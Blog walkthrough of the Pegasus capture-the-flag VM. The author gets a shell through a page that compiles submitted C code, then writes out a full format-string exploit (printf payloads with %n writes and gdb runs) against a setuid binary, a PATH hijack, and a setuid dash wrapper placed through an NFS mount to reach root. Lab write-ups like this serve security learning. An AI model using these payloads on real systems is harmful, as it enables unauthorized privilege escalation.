<!DOCTYPE html><html lang="en" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="generator" content="Jekyll v4.4.1" /><meta property="og:title" content="Pegasus Timbeeeeer!!!! Walkthrough!" /><meta property="og:locale" content="en" /><meta name="description" content="Hello everyone this is pegasus VM walkthrough for practising and having fun :D greetings to everyone for creating this great challenge" /><meta property="og:description" content="Hello everyone this is pegasus VM walkthrough for practising and having fun :D greetings to everyone for creating this great challenge" /><link rel="canonical" href="https://trickster0.github.io/posts/pegasus-timbeeeeer-walkthrough/" /><meta property="og:url" content="https://trickster0.github.io/posts/pegasus-timbeeeeer-walkthrough/" /><meta property="og:site_name" content="trickster0’s Nest" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2015-11-24T00:00:00+08:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="Pegasus Timbeeeeer!!!! Walkthrough!" /><meta name="twitter:site" content="@trickster012" /><meta name="google-site-verification" content="google_meta_tag_verification" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2015-11-24T00:00:00+08:00","datePublished":"2015-11-24T00:00:00+08:00","description":"Hello everyone this is pegasus VM walkthrough for practising and having fun :D greetings to everyone for creating this great challenge","headline":"Pegasus Timbeeeeer!!!! Walkthrough!","mainEntityOfPage":{"@type":"WebPage","@id":"https://trickster0.github.io/posts/pegasus-timbeeeeer-walkthrough/"},"url":"https://trickster0.github.io/posts/pegasus-timbeeeeer-walkthrough/"}</script><title>Pegasus Timbeeeeer!!!! Walkthrough! | trickster0's Nest</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="trickster0's Nest"><meta name="application-name" content="trickster0's Nest"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="https://www.clipartmax.com/png/middle/171-1712035_loki-chibi.png" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">trickster0's Nest</a></div><div class="site-subtitle font-italic">Pentester / Red Teamer / Malware Dev / Exploit Dev / Security Researcher</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/trickster0" aria-label="github" class="order-3" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/trickster012" aria-label="twitter" class="order-4" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['example','doamin.com'].join('@')" aria-label="email" class="order-5" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" class="order-6" > <i class="fas fa-rss"></i> </a> <span class="icon-border order-2"></span> <span id="mode-toggle-wrapper" class="order-1"> <i class="mode-toggle fas fa-adjust"></i> <script type="text/javascript"> class ModeToggle { static get MODE_KEY() { return "mode"; } static get DARK_MODE() { return "dark"; } static get LIGHT_MODE() { return "light"; } constructor() { if (this.hasMode) { if (this.isDarkMode) { if (!this.isSysDarkPrefer) { this.setDark(); } } else { if (this.isSysDarkPrefer) { this.setLight(); } } } var self = this; /* always follow the system prefers */ this.sysDarkPrefers.addListener(function() { if (self.hasMode) { if (self.isDarkMode) { if (!self.isSysDarkPrefer) { self.setDark(); } } else { if (self.isSysDarkPrefer) { self.setLight(); } } self.clearMode(); } self.updateMermaid(); }); } /* constructor() */ setDark() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.DARK_MODE); } setLight() { $('html').attr(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); sessionStorage.setItem(ModeToggle.MODE_KEY, ModeToggle.LIGHT_MODE); } clearMode() { $('html').removeAttr(ModeToggle.MODE_KEY); sessionStorage.removeItem(ModeToggle.MODE_KEY); } get sysDarkPrefers() { return window.matchMedia("(prefers-color-scheme: dark)"); } get isSysDarkPrefer() { return this.sysDarkPrefers.matches; } get isDarkMode() { return this.mode == ModeToggle.DARK_MODE; } get isLightMode() { return this.mode == ModeToggle.LIGHT_MODE; } get hasMode() { return this.mode != null; } get mode() { return sessionStorage.getItem(ModeToggle.MODE_KEY); } /* get the current mode on screen */ get modeStatus() { if (this.isDarkMode || (!this.hasMode && this.isSysDarkPrefer) ) { return ModeToggle.DARK_MODE; } else { return ModeToggle.LIGHT_MODE; } } updateMermaid() { if (typeof mermaid !== "undefined") { let expectedTheme = (this.modeStatus === ModeToggle.DARK_MODE? "dark" : "default"); let config = { theme: expectedTheme }; /* re-render the SVG › <https://github.com/mermaid-js/mermaid/issues/311#issuecomment-332557344> */ $(".mermaid").each(function() { let svgCode = $(this).prev().children().html(); $(this).removeAttr("data-processed"); $(this).html(svgCode); }); mermaid.initialize(config); mermaid.init(undefined, ".mermaid"); } } flipMode() { if (this.hasMode) { if (this.isSysDarkPrefer) { if (this.isLightMode) { this.clearMode(); } else { this.setLight(); } } else { if (this.isDarkMode) { this.clearMode(); } else { this.setDark(); } } } else { if (this.isSysDarkPrefer) { this.setLight(); } else { this.setDark(); } } this.updateMermaid(); } /* flipMode() */ } /* ModeToggle */ let toggle = new ModeToggle(); $(".mode-toggle").click(function() { toggle.flipMode(); }); </script> </span></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>Pegasus Timbeeeeer!!!! Walkthrough!</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>Pegasus Timbeeeeer!!!! Walkthrough!</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> trickster0 </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Tue, Nov 24, 2015, 12:00 AM +0800" >Nov 24, 2015<i class="unloaded">2015-11-24T00:00:00+08:00</i> </span></div><div> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2097 words">11 min read</span></div></div><div class="post-content"><p>Hello everyone this is pegasus VM walkthrough for practising and having fun :D greetings to everyone for creating this great challenge</p><p>I started by running nmap to check all the services that pegasus has on it!&gt;root@Tesla:~# nmap 192.168.7.138 -p- -A</p><p>Starting Nmap 6.49BETA5 ( https://nmap.org ) at 2015-11-05 17:51 EET Nmap scan report for 192.168.7.138 (192.168.7.138) Host is up (0.00016s latency). Not shown: 65531 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 5.9p1 Debian 5ubuntu1.4 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 1024 77:89:5b:52:ed:a5:58:6e:8e:09:f3:9e:f1:b0:d9:98 (DSA) | 2048 d6:62:f5:12:31:36:ed:08:2c:1a:5e:9f:3c:aa:1f:d2 (RSA) |_ 256 c5:f0:be:e5:c0:9c:28:6e:23:5c:48:38:8b:4a:c4:43 (ECDSA) 111/tcp open rpcbind 2-4 (RPC #100000) | rpcinfo: | program version port/proto service | 100000 2,3,4 111/tcp rpcbind | 100000 2,3,4 111/udp rpcbind | 100024 1 36231/udp status |_ 100024 1 42084/tcp status 8088/tcp open http nginx 1.1.19 42084/tcp open status 1 (RPC #100024) MAC Address: 00:0C:29:EA:73:26 (VMware) Device type: general purpose Running: Linux 3.X OS CPE: cpe:/o:linux:linux_kernel:3 OS details: Linux 3.2 - 3.19 Network Distance: 1 hop Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p><p>more after seing these services i checked the nginx server right away to see what the webserver had for us</p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg1.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg1.png" alt="peg1" /></a> Nothing obvious there, although i downloaded the picture and checked it with strings it gave some interesting results.. it gave 2 sets of characters i thought that it might want to hint me on making a wordlist with them but i gave up on it and moved on. next thing i did,was to use dirb to find any secret folders/files but it gave nothing! after a lot of search i checked on another walkthrough and people used dirbuster with another wordlist and so did i</p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg2.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg2.png" alt="peg2" /></a> submit.php file did nothing on its own but apparently it was used with the other file codereview.php file i found</p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg3.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg3.png" alt="peg3" /></a></p><p>Apparently it wanted to hint me that this box would run some inputted code of mine. so i started pasting python,php,perl reverse shells but nothing until i tried C and magic actually happened!!!i used this <a href="https://www.rcesecurity.com/2014/07/slae-shell-reverse-tcp-shellcode-linux-x86/">shell</a></p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg4.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg4.png" alt="peg4" /></a></p><p>i didnt like my shell :/ i needed something better plus the fact that the shell would stop after a while and disconnect me so i created really quick some ssh-keygen and inserted my public key into the authorized_keys. So i connected through ssh :D</p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg5.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg5.png" alt="peg5" /></a> i did some enumeration to the system look around, but nothing interesting except from a fail named my_first. So as the name stated it is a noob’s first program so it is fair to assume that there is a vuln there isn’t it? Also the code that i could execute was C so this is obvious a wannabe C master…Since everything is in C i supposed Format strings vulnerabillities(which as a matter of fact i hate). Not to add that this program will give us elevated rights so one more reason to try using it for our “legal” purpose. I will try to explain what i did as good as i can… I executed the program to check it out</p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg6.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg6.png" alt="peg6" /></a> it is about time testing it for format string vuln</p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg7.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg7.png" alt="peg7" /></a> obiously at the first try i checked for a normal input but at the second try i actually tested it. so what do we see there?? this is a so called format string vuln. how does it work?? when someone compiles a C program and uses some vulnerable functions like printf(and all of its damn family) like this printf (“hi”,%x) what it actually does is put the input at the top of the stack so we request it by asking %x in the inputs of the program to show the address of the stack in hex. so in the second input on the second try we added some %x to get more of the addresses in the stack. On my next step i changed my input a little bit. i added some A’s</p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg8.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg8.png" alt="peg8" /></a> Adter some testing i noticed that i dont need to input format strings on the first input… only the second one had the error. So what did i do here? i added some A’s and some %x’s to see if somewhere along the memory i managed to change an address and after 8 %x’s we can see that the address now is 41414141 which in ascii is AAAA. so apparently we managed to change the memory address there. The system was running ASLR so i ran</p><blockquote><p>ulimit -s unlimited</p></blockquote><p>after that i ran the program on gdb to figure out a few addresses like the system()’s address</p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg9.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg9.png" alt="peg9" /></a> next thing i had to find would be the printf’s function address</p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg10.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg10.png" alt="peg10" /></a> i used objdump, nothing more to add here next thing i did, was to create a small payload by using the program automatically and actually write the printf’s address into the address that we previously changed into AAAAs. how do we do this you ask? well it is really simple we have this amazing format string called %n that will allow us to do it.Plus we before this part on our payload we specified the 8th position of the address. here is what happened</p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg11.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg11.png" alt="peg11" /></a> see? we wrote 4 on the address where we got the segfault so that is good now we need to change that address into the system() address that we have. lets start by getting the second half. we need to find in decimal 0x9060-0x4</p><blockquote><p>mike@pegasus:~$ python -c ‘print 0x9060-0x4’ 36956</p></blockquote><p>i changed a little bit my next payload and ran gdb again to see if we succeeeded in chaniging the second half of the address</p><blockquote><p>mike@pegasus:~$ printf ‘1\n1\n\xfc\x9b\x04\x08%%36956u%%8$n’ &gt; payload mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done. (gdb) r &lt; payload Starting program: /home/mike/my_first &lt; payload WELCOME TO MY FIRST TEST PROGRAM ——————————– Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit</p></blockquote><p>Selection: Enter first number: Enter second number: Error details: ��</p><p>Program received signal SIGSEGV, Segmentation fault. 0x00009060 in ?? () (gdb)</p><blockquote><p>mike@pegasus:~$ printf ‘1\n1\n\xfc\x9b\x04\x08%%36956u%%8$n’ &gt; payload mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done. (gdb) r &lt; payload Starting program: /home/mike/my_first &lt; payload WELCOME TO MY FIRST TEST PROGRAM ——————————– Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit</p></blockquote><p>Selection: Enter first number: Enter second number: Error details: ��</p><p>Program received signal SIGSEGV, Segmentation fault. 0x00009060 in ?? () (gdb)</p><blockquote><p>mike@pegasus:~$ printf ‘1\n1\n\xfc\x9b\x04\x08%%36956u%%8$n’ &gt; payload mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done. (gdb) r &lt; payload Starting program: /home/mike/my_first &lt; payload WELCOME TO MY FIRST TEST PROGRAM ——————————– Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit</p></blockquote><p>Selection: Enter first number: Enter second number: Error details: ��</p><p>Program received signal SIGSEGV, Segmentation fault. 0x00009060 in ?? () (gdb)</p><p>As we can see everything worked out! now we need to change the first half. here is what we did</p><blockquote><p>mike@pegasus:~$ printf ‘1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%9$n’ &gt; payload mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done. (gdb) r &lt; payload Starting program: /home/mike/my_first &lt; payload WELCOME TO MY FIRST TEST PROGRAM ——————————– Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit</p></blockquote><p>Selection: Enter first number: Enter second number: Error details: ����<br /> Program received signal SIGSEGV, Segmentation fault. 0x90609060 in ?? () (gdb)</p><blockquote><p>mike@pegasus:~$ printf ‘1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%9$n’ &gt; payload mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done. (gdb) r &lt; payload Starting program: /home/mike/my_first &lt; payload WELCOME TO MY FIRST TEST PROGRAM ——————————– Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit</p></blockquote><p>Selection: Enter first number: Enter second number: Error details: ����<br /> Program received signal SIGSEGV, Segmentation fault. 0x90609060 in ?? () (gdb)</p><blockquote><p>mike@pegasus:~$ printf ‘1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%9$n’ &gt; payload mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done. (gdb) r &lt; payload Starting program: /home/mike/my_first &lt; payload WELCOME TO MY FIRST TEST PROGRAM ——————————– Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit</p></blockquote><p>Selection: Enter first number: Enter second number: Error details: ����<br /> Program received signal SIGSEGV, Segmentation fault. 0x90609060 in ?? () (gdb)</p><p>In this case we wrote 4 more bytes so teh 36956 went down to 36952. Now we need to find the decimal for the first half</p><blockquote><p>mike@pegasus:~$ python -c ‘print 0x14006-0x9060’ 44966</p></blockquote><p>so i changed my payload again and ran gdb</p><blockquote><p>mike@pegasus:~$ printf ‘1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n’ &gt; payload mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done. (gdb) r &lt; payload Starting program: /home/mike/my_first &lt; payload WELCOME TO MY FIRST TEST PROGRAM ——————————– Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit</p></blockquote><p>Selection: Enter first number: Enter second number: Error details: ���� <br /> sh: 1: Selection:: not found</p><p>Program received signal SIGSEGV, Segmentation fault. 0x08c3be89 in ?? () (gdb)</p><blockquote><p>mike@pegasus:~$ printf ‘1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n’ &gt; payload mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done. (gdb) r &lt; payload Starting program: /home/mike/my_first &lt; payload WELCOME TO MY FIRST TEST PROGRAM ——————————– Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit</p></blockquote><p>Selection: Enter first number: Enter second number: Error details: ���� <br /> sh: 1: Selection:: not found</p><p>Program received signal SIGSEGV, Segmentation fault. 0x08c3be89 in ?? () (gdb)</p><blockquote><p>mike@pegasus:~$ printf ‘1\n1\n\xfc\x9b\x04\x08\xfe\x9b\x04\x08%%36952u%%8$n%%44966u%%9$n’ &gt; payload mike@pegasus:~$ gdb -q ./my_first Reading symbols from /home/mike/my_first…(no debugging symbols found)…done. (gdb) r &lt; payload Starting program: /home/mike/my_first &lt; payload WELCOME TO MY FIRST TEST PROGRAM ——————————– Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit</p></blockquote><p>Selection: Enter first number: Enter second number: Error details: ���� <br /> sh: 1: Selection:: not found</p><p>Program received signal SIGSEGV, Segmentation fault. 0x08c3be89 in ?? () (gdb)</p><p>If you can see the sh: 1: Selection:: then it means we have accomplished out goal and victory should be closer</p><blockquote><p>mike@pegasus:~$ touch Selection: mike@pegasus:~$ nano Selection: mike@pegasus:~$ chmod +x Selection: mike@pegasus:~$ export PATH=$PATH:. mike@pegasus:~$ echo PATH PATH mike@pegasus:~$ echo $PATH /usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:. mike@pegasus:~$ cat payload | ./my_first WELCOME TO MY FIRST TEST PROGRAM ——————————– Select your tool: [1] Calculator [2] String replay [3] String reverse [4] Exit</p></blockquote><p>Selection: Enter first number: Enter second number: Error details: ���� <br /> Segmentation fault (core dumped) mike@pegasus:~$ ls -la /tmp total 108 drwxrwxrwt 2 root root 4096 Nov 23 03:19 . drwxr-xr-x 22 root root 4096 Nov 19 2014 .. -rwsr-sr-x 1 john mike 100284 Nov 23 03:19 dash mike@pegasus:~$</p><p>As you notice, above, i created a file named Selection: and made it executable cause that is what we managed to do with my_first program to execute. Next i added on the $PATH the . so it can execute freely,inserted my payload and ran my_first program that made. What that file that i made did??it copied the /bin/dash file in the /tmp folder with elvated permissions and by elevated permissions i mean john!</p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg12.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg12.png" alt="peg12" /></a> First thing i did, was to add my ssh public key in the authorized_keys of john’s and right away connect via ssh to him</p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg13.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg13.png" alt="peg13" /></a></p><p><a href="https://trickster0.files.wordpress.com/2015/11/peg14.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg14.png" alt="peg14" /></a> i typed sudo -l but this is what i got</p><blockquote><p>john@pegasus:~$ sudo -l Matching Defaults entries for john on this host: env_reset, secure_path=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin</p></blockquote><p>User john may run the following commands on this host: (root) NOPASSWD: /usr/local/sbin/nfs</p><p>so…..yeah</p><blockquote><p>john@pegasus:~$ sudo /usr/local/sbin/nfs start</p><ul><li>Exporting directories for NFS kernel daemon… [ OK ]<li>Starting NFS kernel daemon [ OK ]</ul></blockquote><p>I went back to my Kali box and mounted the NFS. I created a file that would elevate my permissions to root and execute dash</p><blockquote><p>root@Tesla:~# cd /mnt root@Tesla:/mnt# mkdir nfs root@Tesla:/mnt# mount 192.168.7.138:/opt/nfs nfs root@Tesla:/mnt# cd nfs root@Tesla:/mnt/nfs# cat file.c #include #include int main(int argc, char *argv[]){ setreuid(geteuid(), geteuid()); setregid(geteuid(), geteuid()); execv(“/bin/dash”, argv); return 0; } root@Tesla:/mnt/nfs# gcc -o root file.c -m32 root@Tesla:/mnt/nfs# chmod 4777 root</p></blockquote><p>……And back to john</p><blockquote><p>john@pegasus:/opt/nfs$ ./root</p><h1 id="id">id</h1><p>uid=0(root) gid=0(root) groups=0(root),1000(john)</p><h1 id="cd-root">cd /root</h1><h1 id="ls">ls</h1><p>flag</p><h1 id="cat-flag">cat flag</h1></blockquote><p><a href="https://trickster0.files.wordpress.com/2015/11/peg15.png"><img data-proofer-ignore data-src="https://trickster0.files.wordpress.com/2015/11/peg15.png" alt="peg15" /></a> Hallelujah!! It was kinda hard since i hated format strings but anyway it was fun. thx to everyone + some bonus below</p><p>This is the code that executed my C reverse shell from the codereview.php and also stopped it(mixed feelings on this one)</p><blockquote><p>mike@pegasus:~$ cat check_code.sh #!/bin/sh #</p><h1 id="i-am-a-human-reviewing-submitted-source-code-">I am a ‘human’ reviewing submitted source code :)</h1><p>#</p></blockquote><p>SOURCE_CODE=”/opt/code_review/code.c”</p><h1 id="kill-whatever-is-running-after-120-seconds">Kill whatever is running after 120 seconds</h1><p>TIMEOUT=120</p><p>while true; do echo “# Checking for code.c…” if [ -f $SOURCE_CODE ]; then echo “ # Compile…” /usr/bin/gcc -o /home/mike/code $SOURCE_CODE /bin/chmod 755 /home/mike/code echo “ # Run” (/home/mike/code) &amp; PID=$! # Let the code run for $TIMEOUT, then kill it if still executing (/bin/sleep $TIMEOUT &amp;&amp; kill -9 $PID; echo “ # Killed ./code”) 2&gt;/dev/null &amp; WATCHER=$! # Kill the watched (code stopped executing before $TIMEOUT) wait $PID 2&gt;/dev/null &amp;&amp; kill -9 $WATCHER; echo “ # Killed watcher” echo “ # Cleanup…” /bin/rm -f /home/mike/code $SOURCE_CODE fi /bin/sleep 1 done</p></div><div class="post-tail-wrapper text-muted"><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/challenge/" class="post-tag no-text-decoration" >challenge</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/pegasus/" class="post-tag no-text-decoration" >pegasus</a> <a href="/tags/timber/" class="post-tag no-text-decoration" >timber</a> <a href="/tags/vm/" class="post-tag no-text-decoration" >vm</a> <a href="/tags/vulnhub/" class="post-tag no-text-decoration" >vulnhub</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Pegasus Timbeeeeer!!!! Walkthrough! - trickster0's Nest&url=https://trickster0.github.io/posts/pegasus-timbeeeeer-walkthrough/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Pegasus Timbeeeeer!!!! Walkthrough! - trickster0's Nest&u=https://trickster0.github.io/posts/pegasus-timbeeeeer-walkthrough/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=Pegasus Timbeeeeer!!!! Walkthrough! - trickster0's Nest&url=https://trickster0.github.io/posts/pegasus-timbeeeeer-walkthrough/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink('', 'Link copied successfully!')" data-toggle="tooltip" data-placement="top" title="Copy link"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/Primitive-Injection/">Primitive Injection - Breaking the Status Quo</a><li><a href="/posts/Custom-ReadMemory-API/">Custom ReadMemory API</a><li><a href="/posts/Halo's-Gate-Evolves-to-Tartarus-Gate/">Halo's Gate Evolves -> Tartarus' Gate</a><li><a href="/posts/Solving-the-BFS-EkoParty/">Solving the BFS Ekoparty 2019 Exploitation Challenge</a><li><a href="/posts/earlybird-apc-queue-injection-with-processstatechange-a-twist/">EarlyBird APC Queue Injection With a ProcessStateChange Twist</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/vulnhub/">vulnhub</a> <a class="post-tag" href="/tags/vm/">vm</a> <a class="post-tag" href="/tags/challenge/">challenge</a> <a class="post-tag" href="/tags/challenges/">challenges</a> <a class="post-tag" href="/tags/hack/">hack</a> <a class="post-tag" href="/tags/0/">%0</a> <a class="post-tag" href="/tags/asa/">asa</a> <a class="post-tag" href="/tags/certificate/">certificate</a> <a class="post-tag" href="/tags/cisco/">cisco</a></div></div></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/tr0ll2-the-revenge-of-the-tr0ll/"><div class="card-body"> <span class="timeago small" >Oct 24, 2015<i class="unloaded">2015-10-24T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Tr0ll2: The Revenge Of The Tr0ll!!</h3><div class="text-muted small"><p> Hello everyone this is tr0ll 2 as i promised. Time to get some root access on the server, cause i didnt do much these days, so i will stop blabbing and start to explain what is going on and how eve...</p></div></div></a></div><div class="card"> <a href="/posts/lord-of-the-root-1-0-1-write-up/"><div class="card-body"> <span class="timeago small" >Oct 8, 2015<i class="unloaded">2015-10-08T00:00:00+08:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Lord Of The Root: 1.0.1 write-up</h3><div class="text-muted small"><p> So this is the 